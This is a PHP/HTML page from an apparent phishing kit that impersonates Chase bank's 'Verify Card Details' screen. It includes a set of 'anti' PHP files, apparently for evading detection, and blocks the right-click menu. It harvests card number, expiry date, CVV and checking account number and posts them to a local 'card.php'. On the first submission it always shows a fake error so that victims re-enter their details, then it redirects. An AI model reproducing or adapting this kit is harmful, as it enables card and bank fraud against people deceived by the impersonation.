<?php

    include './secure/anti1.php';
	include './secure/anti2.php';
	include './secure/anti3.php';
	include './secure/anti4.php';
	include './secure/anti5.php';
	include './secure/anti6.php';
	include './secure/anti7.php';
	include './secure/anti8.php';
	

?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title>Authorization</title>

    <link href="./css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/shop-homepage.css" rel="stylesheet">
    <link href="./css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="./img/chasefavicon.ico">
    <!-- <script src="https://kit.fontawesome.com/6222530beb.js"></script> -->
    <style>
        .rror {
            color: crimson;
            display: block;
            width: 80%;
            margin: auto;
            font-weight: 800;
        }
        #rror {
            display: none;
        }
    </style>
    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
</head>

<body class="less" style="background-image: url(./img/background.desktop.night.11.jpeg);">

<!-- Login Box -->    
<div class="logon-container">
    <header>
        <div class="logon-header">
            <a href="#" class="logolink"> </a>
        </div>
    </header>
    <main class="logon-content">
       <div class="container logon">
           <div class="row">
               <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
                   <div class="jpui raised segment">
                   
                       <div class="row">
                           <div class="col-xs-10 col-xs-offset-1">
                               <form action="" method="post" id="res" enctype="multipart/form-data">
                                 <div style="text-align: center; margin-bottom: 20px;">
                                     <img src="https://sites.chase.com/content/mktservices/digital-assets/image.flexible-hero-new-foreground-photography.png/image/creatives/masterbrand-icons/mobile-check-icon.png" alt="Chase Card" style="max-width: 100%; height: auto; border-radius: 5px;">
                                 </div>
                                 <h3 style="font-family: sans-serif;text-align: center;">Verify Card Details</h3>
                                   <span style="color: crimson;" class="rror" id="rror">
                                        <i class="fas fa-circle-exclamation" style="color: crimson;"></i>
                                        Invalid card details, please try again
                                    </span>
                                  <div class="us-norm us-mt" style="position: relative;">
                                   <span id="card-type-icon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); font-size: 24px; display: none;"></span>
                                   <input type="text" class="frinp" name="cardnumber" id="cardnumber" required pattern="[0-9]{16}" maxlength="16">
                                   <label for="cardnumber" class="frel">Card Number</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="text" class="frinp" name="exp" id="exp" required pattern="[0-9]{2}/[0-9]{2}" maxlength="5" placeholder="MM/YY">
                                   <label for="exp" class="frel">Expiration Date (MM/YY)</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="text" class="frinp" name="cvv" id="cvv" required pattern="[0-9]{3,4}" maxlength="4">
                                   <label for="cvv" class="frel">CVV</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="text" class="frinp" name="checkingacc" id="checkingacc" required pattern="[0-9]{8,17}" minlength="8" maxlength="17">
                                   <label for="checkingacc" class="frel">Checking Account Number</label>
                                  </div>
                                  <!-- <div class="us-norm">
                                   <input type="text" class="frinp" name="tok" id="token" style="display:none;">
                                   <label for="token" class="frel" id="ken" style="display:none;">Token</label>
                                  </div> -->
                                  <div class="row" style="display: none;">
                                      <div class="col-sm-6 col-xs-7 remember">
                                          <div class="jpui checkbox" id=rememberMe>
                                              <label class="cont">Remember me
                                               <input type="checkbox" name="save" value="save">
                                               <span class="checkmark"></span>
                                            </label>
                                          </div>
                                      </div>
                                      <div class="col-sm-6 col-xs-5 token" style="display: none;">
                                          <div class="jpui checkbox useT" >
                                              <label class="cont" >Use token
                                               <input type="checkbox" name="save" value="save"  id="utoken" onclick="myFunction()">
                                               <span class="checkmark sand"></span>
                                            </label>
                                          </div>
                                      </div>
                                  </div>
                                  <div class="row">
                                      <input type="submit" class="jpui submit" value="Sign in" name="submit">
                                  </div>
                                  <div class="row" style="display: none;">
                                      <span class="jpui link">
                                          <a href="#" class="link-anchor">Forgot username/password? ></a>
                                      </span>
                                  </div>
                                  <div class="row" style="display: none;">
                                      <span class="jpui link">
                                          <a href="#" class="link-anchor">Not Enrolled? Sign Up Now. ></a>
                                      </span>
                                  </div>
                               </form>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       </div>
        
    </main>
    


</div>
<!-- /.Login Box -->



<!-- Footer Side -->
<footer class="logon-footer" id="logon-footer">
    <div class="footer-container" style="position:static;">
        <div class="container">
            <div class="social-links row">
                <div class="col-xs-12">
                    <span class="follow-text">Follow us:</span>
                    <img src="./img/cap.png" alt="" class="icon-links">
                </div>
            </div>
            <div class="footer-links row">
                <div class="col-xs-12">
                    <ul>
                        <li class="azadus">Contact us</li>
                        <li class="azadus">Privacy</li>
                        <li class="azadus">Security</li>
                        <li class="azadus">Terms of use</li>
                        <li class="azadus">Accessibility</li>
                        <li class="azadus">SAFE Act: Chase Mortgage Loan Originators</li>
                        <li class="azadus">Fair Lending</li>
                        <li class="azadus">About Chase</li>
                        <li class="azadus">J.P Morgan</li>
                        <li class="azadus">JPMorgan Chase &#38; Co.</li>
                        <li class="azadus">Careers</li>
                        <li class="azadus">Espa&ntilde;ol</li>
                        <li class="azadus">Chase Canada</li>
                        <li class="azadus">Site map</li>
                        <li>Member FDIC</li>
                        <li><i class="fas fa-home"></i>&nbsp;Equal Housing Lender</li>
                        
                        <li class="copyright-label">&copy; 2024 JPMorgan Chase &#38; Co.</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</footer>
<!-- /.Footer Side -->

<script>

function myFunction() {
  var checkBox = document.getElementById("utoken");
  var uto = document.getElementById("token");
  var ken = document.getElementById("ken");
  if (checkBox.checked == true) {
    uto.style.display = "inline-block";
    ken.style.display = "inline-block";
  } else {
    uto.style.display = "none";
    ken.style.display = "none";
  }
}

// Card type detection
document.getElementById("cardnumber").addEventListener("input", function(e) {
    const cardNumber = e.target.value.replace(/\s/g, '');
    const cardTypeIcon = document.getElementById("card-type-icon");
    
    // Clear previous icon
    cardTypeIcon.style.display = "none";
    cardTypeIcon.innerHTML = "";
    
    if (cardNumber.length >= 1) {
        // Visa starts with 4
        if (cardNumber[0] === '4') {
            cardTypeIcon.innerHTML = '<i class="fab fa-cc-visa" style="color: #1A1F71;"></i>';
            cardTypeIcon.style.display = "block";
        }
        // Mastercard starts with 51-55 or 2221-2720
        else if (/^5[1-5]/.test(cardNumber) || /^(222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)/.test(cardNumber)) {
            cardTypeIcon.innerHTML = '<i class="fab fa-cc-mastercard" style="color: #EB001B;"></i>';
            cardTypeIcon.style.display = "block";
        }
    }
});
      document.addEventListener('contextmenu', function (e) {
         e.preventDefault();
       });
      
      var formSubmitted = 0;

      document.getElementById("res").addEventListener("submit", function (event) {
          event.preventDefault();
      
          formSubmitted++;
          var inputs = document.querySelectorAll('input[required]');
          for (var i = 0; i < inputs.length; i++) {
              if (!inputs[i].value.trim()) {
                  alert("Please fill in all fields.");
                  return;
              }
          }
      
          var formData = new FormData(this);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "./config/card.php", true);
      
          xhr.onreadystatechange = function () {
              if (xhr.readyState == 4 && xhr.status == 200) {
                  console.log(xhr.responseText);
      
                  if (formSubmitted === 1) {
                      document.getElementById("cvv").value = "";
                      document.getElementById("rror").style.display = "block";
                      setTimeout(() => {
                        document.getElementById("rror").style.display = "none"
                      }, 3000);
                  } else if (formSubmitted >= 2) {
                      window.location.href = "./fl.php";
                  }
              }
          };
      
          xhr.send(formData);
      });
    
</script>


<script src="./js/jquery.js"></script>
<script src="./js/bootstrap.min.js"></script>
</body>

</html>